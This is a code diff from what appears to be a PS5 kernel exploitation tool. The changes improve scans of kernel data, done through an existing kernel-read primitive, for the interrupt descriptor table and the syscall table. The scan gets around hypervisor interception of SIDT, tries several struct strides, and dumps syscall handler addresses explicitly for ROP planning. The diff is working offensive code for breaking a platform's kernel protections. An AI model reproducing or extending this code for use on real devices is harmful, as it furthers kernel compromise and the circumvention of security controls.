@@ -2094,43 +2094,67 @@ ring3_fallback:
         /* 4d-3: IDT handler addresses
          * SIDT is intercepted by PS5 HV (VMCB intercept bit) and kills
          * the process.  Find IDT by scanning kdata instead.
-         * IDT entries are 16-byte gate descriptors with handler addresses
-         * in ktext and selector = kernel CS (typically 0x20). */
+         * IDT entries are 16-byte gate descriptors:
+         *   offset 0: uint16 offset_lo
+         *   offset 2: uint16 selector  (kernel CS = 0x10 on FreeBSD)
+         *   offset 4: uint8  ist
+         *   offset 5: uint8  type_attr (present | DPL | type)
+         *              interrupt gate = 0x8E, trap gate = 0x8F
+         *   offset 6: uint16 offset_mid
+         *   offset 8: uint32 offset_hi
+         *   offset 12: uint32 reserved (0)
+         * We match: handler in ktext, type_attr = 0x8E or 0x8F,
+         *           selector is valid kernel CS (non-zero, ≤0x40, aligned to 8),
+         *           and reserved == 0. */
         {
             printf("[*] Searching kdata for IDT (SIDT is HV-intercepted)...\n");
             fflush(stdout);
 
             uint64_t idt_kva = 0;
+            uint16_t idt_sel = 0;
             uint8_t idt_pg[4096];
 
-            for (uint64_t off = 0; off < 0x800000 && !idt_kva; off += 4096) {
+            /* Scan first 64MB of kdata (IDT may be in BSS, which extends ~40MB+) */
+            for (uint64_t off = 0; off < 0x4000000 && !idt_kva; off += 4096) {
                 uint64_t kva = g_kdata_base + off;
                 if (kernel_copyout(kva, idt_pg, 4096) != 0) continue;
 
                 for (int boff = 0; boff <= 4096 - 16*8 && !idt_kva; boff += 16) {
                     int good = 0;
+                    uint16_t first_sel = 0;
                     for (int e = 0; e < 8; e++) {
                         uint8_t *g = &idt_pg[boff + e * 16];
                         uint16_t lo, sel, mid;
-                        uint32_t hi;
+                        uint32_t hi, rsv;
+                        uint8_t type_attr;
                         memcpy(&lo,  g + 0, 2);
                         memcpy(&sel, g + 2, 2);
+                        type_attr = g[5];
                         memcpy(&mid, g + 6, 2);
                         memcpy(&hi,  g + 8, 4);
+                        memcpy(&rsv, g + 12, 4);
                         uint64_t h = (uint64_t)lo | ((uint64_t)mid << 16) |
                                      ((uint64_t)hi << 32);
-                        if (sel == 0x20 && h >= g_ktext_base &&
-                            h < g_ktext_base + 0x2000000)
+                        /* Check: handler in ktext, valid gate type, valid selector, reserved=0 */
+                        if (h >= g_ktext_base && h < g_ktext_base + 0x2000000 &&
+                            (type_attr == 0x8E || type_attr == 0x8F) &&
+                            sel != 0 && sel <= 0x40 && (sel & 7) == 0 &&
+                            rsv == 0) {
                             good++;
+                            if (first_sel == 0) first_sel = sel;
+                        }
                     }
-                    if (good >= 6) idt_kva = kva + boff;
+                    if (good >= 6) {
+                        idt_kva = kva + boff;
+                        idt_sel = first_sel;
+                    }
                 }
             }
 
             if (idt_kva) {
-                printf("[+] IDT found at kdata+0x%lx (KVA 0x%lx)\n",
+                printf("[+] IDT found at kdata+0x%lx (KVA 0x%lx), kernel CS=0x%x\n",
                        (unsigned long)(idt_kva - g_kdata_base),
-                       (unsigned long)idt_kva);
+                       (unsigned long)idt_kva, idt_sel);
 
                 static const struct { int vec; const char *name; } idt_vecs[] = {
                     {0, "#DE"}, {1, "#DB"}, {2, "NMI"}, {3, "#BP"},
@@ -2154,65 +2178,74 @@ ring3_fallback:
                            (unsigned long)(handler - g_ktext_base), sel);
                 }
             } else {
-                printf("[-] IDT not found in kdata (first 8MB).\n");
+                printf("[-] IDT not found in kdata (first 64MB).\n");
             }
             fflush(stdout);
         }
 
         /* 4d-4: Sysent table dump (first 32 entries for ROP planning) */
         {
-            /* On FreeBSD, sysent is in kdata at a known offset.
-             * Each entry: { int sy_narg; sy_call_t *sy_call; ... }
-             * On AMD64 FreeBSD 11: sizeof(struct sysent) = 16 bytes
-             *   offset 0: int32_t sy_narg (4 bytes)
-             *   offset 4: int32_t pad    (4 bytes)
-             *   offset 8: void *sy_call  (8 bytes) */
+            /* On FreeBSD amd64, struct sysent layout:
+             *   offset 0:  int32_t sy_narg           (4 bytes)
+             *   offset 4:  padding                   (4 bytes)
+             *   offset 8:  sy_call_t *sy_call        (8 bytes)
+             *   offset 16: au_event_t sy_auevent     (2 bytes + 6 pad)
+             *   offset 24: systrace_args_func_t      (8 bytes)
+             *   offset 32: u_int32_t sy_entry        (4 bytes)
+             *   offset 36: u_int32_t sy_return       (4 bytes)
+             *   offset 40: u_int32_t sy_flags        (4 bytes)
+             *   offset 44: u_int32_t sy_thrcnt       (4 bytes)
+             * Total: 48 bytes.  But Sony may have modified this.
+             * Try strides 16, 32, 48 to auto-detect. */
             printf("[*] Scanning kdata for sysent table...\n");
             fflush(stdout);
 
-            /* Read sysent[0] (nosys) through sysent[10] to find the table.
-             * sysent[1] = sys_exit (1 arg), sysent[2] = sys_fork (0 args),
-             * sysent[3] = sys_read (3 args), sysent[4] = sys_write (3 args).
-             * Match pattern: narg sequence {0,1,0,3,3,...} */
             static const int expected_nargs[] = {0, 1, 0, 3, 3, 1, 3, 0, 3};
             int sysent_found = 0;
             uint64_t sysent_kva = 0;
+            int sysent_stride = 0;
 
-            /* Search kdata for the sysent array (scan first 64MB).
-             * Read 4KB blocks and search within to minimize syscalls.
-             * sysent entries are 16-byte aligned, so check every 16 bytes. */
+            /* Try common entry sizes: 48 (standard FreeBSD), 32, 16 */
+            static const int strides[] = {48, 32, 16};
             uint8_t blk[4096];
-            int match_size = 16 * 9;  /* 9 entries × 16 bytes = 144 bytes */
 
-            for (uint64_t pg = 0; pg < 0x4000000 && !sysent_found; pg += 4096) {
-                uint64_t kva = g_kdata_base + pg;
-                if (kernel_copyout(kva, blk, 4096) != 0) continue;
+            for (unsigned si = 0; si < 3 && !sysent_found; si++) {
+                int stride = strides[si];
+                int match_size = stride * 9;
 
-                for (int boff = 0; boff <= 4096 - match_size && !sysent_found; boff += 16) {
-                    int match = 1;
-                    for (int i = 0; i < 9 && match; i++) {
-                        int32_t narg;
-                        memcpy(&narg, &blk[boff + i * 16], 4);
-                        if (narg != expected_nargs[i]) match = 0;
-                    }
-                    if (match) {
-                        uint64_t call0;
-                        memcpy(&call0, &blk[boff + 8], 8);
-                        if (call0 >= g_ktext_base && call0 < g_ktext_base + 0x2000000) {
-                            sysent_kva = kva + boff;
-                            sysent_found = 1;
+                for (uint64_t pg = 0; pg < 0x4000000 && !sysent_found; pg += 4096) {
+                    uint64_t kva = g_kdata_base + pg;
+                    if (kernel_copyout(kva, blk, 4096) != 0) continue;
+
+                    /* Check at 8-byte alignment (struct may have 8-byte alignment) */
+                    for (int boff = 0; boff <= 4096 - match_size && !sysent_found; boff += 8) {
+                        int match = 1;
+                        for (int i = 0; i < 9 && match; i++) {
+                            int32_t narg;
+                            memcpy(&narg, &blk[boff + i * stride], 4);
+                            if (narg != expected_nargs[i]) match = 0;
+                        }
+                        if (match) {
+                            /* Verify sy_call[0] is in ktext */
+                            uint64_t call0;
+                            memcpy(&call0, &blk[boff + 8], 8);
+                            if (call0 >= g_ktext_base && call0 < g_ktext_base + 0x2000000) {
+                                sysent_kva = kva + boff;
+                                sysent_stride = stride;
+                                sysent_found = 1;
+                            }
                         }
                     }
                 }
             }
 
             if (sysent_found) {
-                printf("[+] Sysent table at kdata+0x%lx (KVA 0x%lx)\n",
+                printf("[+] Sysent table at kdata+0x%lx (KVA 0x%lx), entry size=%d bytes\n",
                        (unsigned long)(sysent_kva - g_kdata_base),
-                       (unsigned long)sysent_kva);
+                       (unsigned long)sysent_kva, sysent_stride);
 
                 /* Dump key syscalls for ROP planning */
-                printf("[*] Key sysent entries (sy_narg, sy_call → ktext offset):\n");
+                printf("[*] Key sysent entries (sy_narg, sy_call -> ktext offset):\n");
                 static const struct { int num; const char *name; } key_syscalls[] = {
                     {0, "nosys"}, {1, "exit"}, {2, "fork"}, {3, "read"},
                     {4, "write"}, {5, "open"}, {6, "close"},
@@ -2224,8 +2257,8 @@ ring3_fallback:
                 };
                 for (unsigned i = 0; i < sizeof(key_syscalls)/sizeof(key_syscalls[0]); i++) {
                     int num = key_syscalls[i].num;
-                    uint8_t entry[16];
-                    kernel_copyout(sysent_kva + num * 16, entry, 16);
+                    uint8_t entry[64];
+                    kernel_copyout(sysent_kva + (uint64_t)num * sysent_stride, entry, sysent_stride);
                     int32_t narg;
                     uint64_t sy_call;
                     memcpy(&narg, entry, 4);
@@ -2244,6 +2277,7 @@ ring3_fallback:
                 printf("    Use sysent sy_call addresses as ktext anchors.\n");
             } else {
                 printf("[-] Sysent table not found in kdata (first 64MB).\n");
+                printf("    Tried entry sizes: 48, 32, 16 bytes.\n");
             }
         }
 
